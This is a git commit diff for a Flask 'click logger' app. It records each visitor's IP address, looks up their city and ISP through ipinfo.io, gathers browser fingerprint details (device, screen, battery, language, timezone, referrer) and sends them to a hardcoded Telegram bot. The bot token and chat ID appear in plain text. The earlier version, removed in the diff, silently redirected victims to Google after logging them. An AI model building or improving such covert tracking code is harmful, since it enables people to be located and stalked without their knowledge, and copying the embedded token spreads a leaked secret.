7ee17b436007ca68853c93c1f92a47411b9a224c
sᴛᴀʀ ʙᴏɪ <bgmim2890@gmail.com>
2025-07-29 05:12:25 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,34 +1,51 @@
-from flask import Flask, request, redirect
+from flask import Flask, render_template, request
 import requests
-import user_agents
-from datetime import datetime
+import datetime
 
 app = Flask(__name__)
 
-BOT_TOKEN = "7638665325:AAEnpRe7ZTHK7VIfyVlM7lfPq9yBpcbhVzo"
-CHAT_ID = "6690693429"
-REDIRECT_URL = "https://www.google.com/"
+# Your Telegram Bot Setup
+BOT_TOKEN = '7638665325:AAEnpRe7ZTHK7VIfyVlM7lfPq9yBpcbhVzo'
+CHAT_ID = '6690693429'
 
-def send_to_telegram(text):
+def send_telegram_alert(message):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    data = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
+    data = {"chat_id": CHAT_ID, "text": message}
     requests.post(url, data=data)
 
 @app.route('/')
-def log_user():
-    ip = request.remote_addr
-    ua_string = request.headers.get('User-Agent')
-    ua = user_agents.parse(ua_string)
-    device = f"{ua.device.family} | {ua.os.family} {ua.os.version_string} | {ua.browser.family} {ua.browser.version_string}"
-    time = datetime.now().strftime("%d-%b-%Y %I:%M %p")
-    message = f"""
-📥 <b>New Click Logged!</b>
-🌐 <b>IP:</b> {ip}
-🕹 <b>Device:</b> {device}
-⏱ <b>Time:</b> {time}
-"""
-    send_to_telegram(message.strip())
-    return redirect(REDIRECT_URL)
+def home():
+    return render_template('index.html')
 
-if __name__ == '__main__':
-    app.run()
+@app.route('/log', methods=['POST'])
+def log():
+    data = request.json
+    ip = request.remote_addr
+
+    # Get IP info
+    ip_info = requests.get(f"https://ipinfo.io/{ip}/json").json()
+    loc = ip_info.get("city", "") + ", " + ip_info.get("region", "") + " (" + ip_info.get("country", "") + ")"
+    isp = ip_info.get("org", "")
+    
+    # Get Time
+    time = datetime.datetime.now().strftime("%d-%b-%Y %I:%M %p")
+
+    msg = f"""
+📥 New Click Logged!
+
+🌐 IP: {ip}
+🌎 Location: {loc}
+📡 ISP: {isp}
+
+📱 Device: {data.get('device')}
+🧠 Browser: {data.get('browser')}
+📏 Screen: {data.get('screen')}
+🔋 Battery: {data.get('battery')}
+🗣 Language: {data.get('lang')}
+🕒 Timezone: {data.get('timezone')}
+🔗 Referrer: {data.get('ref')}
+
+⏱ Time: {time}
+"""
+    send_telegram_alert(msg)
+    return {"status": "logged"}
